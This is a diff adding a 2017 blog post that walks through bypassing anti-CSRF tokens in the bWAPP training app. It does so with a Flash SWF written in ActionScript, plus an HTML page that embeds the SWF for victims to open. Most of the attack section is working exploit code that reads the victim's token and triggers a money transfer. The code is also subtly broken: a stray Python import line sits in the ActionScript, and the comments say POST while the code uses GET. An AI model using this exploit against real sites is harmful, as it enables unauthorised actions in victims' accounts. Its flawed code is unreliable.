@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+	<meta charset="utf-8">
+	<meta name="description" content=''>
+	<meta name="keywords" content=''>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="stylesheet" href='https://www.vishalmishra.in/css/bootstrap.min.css'>
+	<title>Bypass Cross Site Request Forgery Protection</title>
+	<nav class="navbar text-center sticky-top bg-white mt-2 mb-1">
+		<a href='https://www.vishalmishra.in/'><span class="btn btn-sm btn-outline-primary">Home</span></a>
+		<a href='https://www.vishalmishra.in/about'><span class="btn btn-sm btn-outline-secondary">About</span></a>
+		<a href='https://www.vishalmishra.in/post'><span class="btn btn-sm btn-outline-success">Blog</span></a>
+		<a href='https://www.vishalmishra.in/tags'><span class="btn btn-sm btn-outline-warning">Tags</span></a>
+	</nav>
+</head>
+<body>
+      <div id="content">
+
+
+	<section class="container text-monospace text-justified mt-3">
+	  <h2>Bypass Cross Site Request Forgery Protection</h2>
+	  <small class="text-secondary mb-5">Posted on December 1, 2017 | 3 minute read</small>
+	  <p><h2 id="attack">Attack</h2>
+<p>Cross Site Request Forgery (CSRF) is an attack where a malicious entity tricks a victim into performing actions on behalf of the attacker. The impact of the attack would depend on the level of authorization that the victim who is being exploited is having into the system.
+The most popular implementation to prevent Cross-site Request Forgery (CSRF), is to make use of a nonce that is associated with a particular user and it's current view model of the web page. This token is called a anti-CSRF Token or a Synchronizer Token.
+In bWapp (BeeBox) CSRF level high challenge, the attacker need to bypass this token in order to complete this challenge.</p>
+<h2 id="script">Script</h2>
+<pre><code class="language-ActiveX" data-lang="ActiveX">// csrfBypass.as
+
+import socket,ssl
+
+// BypassCSRFtransferMoney bWaPP
+// Author: Vishal_alt
+// BwApp Level:High CSRF challenge
+
+package {
+ import flash.display.Sprite;
+ import flash.events.*;
+ import flash.net.URLRequestMethod;
+ import flash.net.URLRequest;
+ import flash.net.URLLoader;
+
+ public class csrfBypass extends Sprite {
+  public function csrfBypass() {
+   // Target URL from where the data is to be retrieved
+   var readFrom:String = &quot;http://mybuggy.app/bWAPP/csrf_2.php&quot;;
+   var readRequest:URLRequest = new URLRequest(readFrom);
+   var getLoader:URLLoader = new URLLoader();
+   getLoader.addEventListener(Event.COMPLETE, eventHandler);
+   try {
+    getLoader.load(readRequest);
+   } catch (error:Error) {
+    trace(&quot;Error loading URL: &quot; + error);
+   }
+  }
+
+
+  private function eventHandler(event:Event):void {
+   // This assigns the reponse from the first 
+   // request to &quot;reponse&quot;. The antiCSRF token is
+   // somwhere in this reponse
+   var response:String = event.target.data;
+
+   // This line looks for the line in the response 
+   //that contains the CSRF token
+   var CSRF:Array = response.match(/token.*/);
+
+   // This line extracts the value of the CSRF token, 
+   // and assigns it to &quot;token&quot;
+   var token:String = CSRF[0].split(&quot;\&quot;&quot;)[4];
+
+   // These next two lines create the prefix and the 
+   // suffix for the POST request
+   var prefix:String = &quot;token=&quot;
+   var suffix:String = &quot;&amp;account=123-45678-90&amp;amount=900&amp;action=transfer&quot;
+
+   // This section sets up a new URLRequest object and
+   // sets the method to post   
+   var sendTo:String = &quot;http://mybuggy.app/bWAPP/csrf_2.php?&quot;
+   var sendRequest:URLRequest = new URLRequest(sendTo);
+   sendRequest.method = URLRequestMethod.GET;
+
+   // This next line sets the data portion of the GET
+   // request to the &quot;prefix&quot; + &quot;token&quot; + &quot;suffix&quot;
+   sendRequest.data = prefix.concat(token,suffix)
+   
+   // Time to create the URLLoader object and send the 
+   // POST request containing the CSRF token
+   var sendLoader:URLLoader = new URLLoader();
+   try {
+    sendLoader.load(sendRequest);
+   	   } 
+   catch (error:Error) {
+    trace(&quot;Error loading URL: &quot; + error);
+   	  }
+    }
+  }
+}
+
+</code></pre><p>Using the above active script we can generate a SWF flash file. This flash file can easily help in bypassing the CSRF protection because the target site crossdomain.xml allows all with *  ;-) . SWF flash file will send a background request once accessed by the victim, through his (victim) web browser (Yes you need to lure victim, call Mr. Robot if you need help :D) to the target domain and will fetch the anti-CSRF token via first request. Onces the token is fetched it will send another request to perform an authorized action in behalf of the victim user which in this case is money transfer.</p>
+<p>Now all we need to do is create a malicious HTML page and embedd this SWF in it and entice victim to just open it in order to our mount the bypass attack.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTML" data-lang="HTML"><span style="color:#75715e">&lt;!--</span><span style="color:#75715e">This is byPassCSRF.html</span><span style="color:#75715e">--&gt;</span>
+
+&lt;<span style="color:#f92672">html</span>&gt;
+
+&lt;<span style="color:#f92672">object</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span>&gt;
+    &lt;<span style="color:#f92672">param</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;movie&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;csrfBypass.swf&#34;</span>&gt;
+    &lt;<span style="color:#f92672">embed</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;csrfBypass.swf&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;100&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;100&#34;</span>&gt;
+    &lt;/<span style="color:#f92672">embed</span>&gt;
+&lt;/<span style="color:#f92672">object</span>&gt;
+
+&lt;/<span style="color:#f92672">html</span>&gt;
+
+
+</code></pre></div><h2 id="exploit">Exploit</h2>
+<p><img src="https://www.vishalmishra.in/media/csrf-Bypass.gif" alt=" XSRF Protection Bypass" title="Flash Exploit in Action!!"></p>
+<h5 id="references"><strong>References</strong>:</h5>
+<ol>
+<li><a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)">CSRF</a></li>
+<li><a href="https://sourceforge.net/projects/bwapp/">bWapp</a></li>
+</ol>
+</p>
+	  <code>tags:<span class='badge badge-dark'><a class='text-white' href='https://www.vishalmishra.in/tags/web%20attack'>Web Attack</a></span>
+	  <span class='badge badge-dark'><a class='text-white' href='https://www.vishalmishra.in/tags/swf'>SWF</a></span>
+	  <span class='badge badge-dark'><a class='text-white' href='https://www.vishalmishra.in/tags/exploit'>Exploit</a></span>
+	  <span class='badge badge-dark'><a class='text-white' href='https://www.vishalmishra.in/tags/hack'>Hack</a></span>
+	  <span class='badge badge-dark'><a class='text-white' href='https://www.vishalmishra.in/tags/web%20exploit'>Web Exploit</a></span>
+	  
+	  </code>
+	  <div class="container mt-2" id="comments">
+	    
+		<small class="mt-1">Please mail your comments to <a href="vishal_mishra@live.com">vishal_mishra@live.com</a></small><br>
+	    
+	  </div>
+	</section>
+
+
+
+      </div>
+  </body><footer>
+  <div class="container-fluid bg-dark text-white text-monospace text-center mt-4">
+    <small> | Powered by <a href="https://gohugo.io">Hugo</a></small>
+  </div>
+  
+</footer>
+</html>
